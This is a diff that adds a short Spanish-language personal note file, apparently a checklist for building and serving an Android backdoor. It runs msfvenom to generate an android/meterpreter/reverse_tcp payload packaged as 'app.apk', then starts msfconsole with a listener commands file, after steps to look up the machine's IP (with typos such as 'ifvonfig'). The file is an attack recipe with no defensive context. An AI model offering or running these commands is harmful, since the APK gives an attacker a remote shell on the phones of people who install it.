@@ -1,0 +1,6 @@
+1. ifvonfig
+2. copiar ip en inet
+3. msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=666 -o /home/daniel/Escritorio/app.apk
+4. crear archivo comandos en excrotorio con los comandos
+5. msfconsole -r comandos 
+
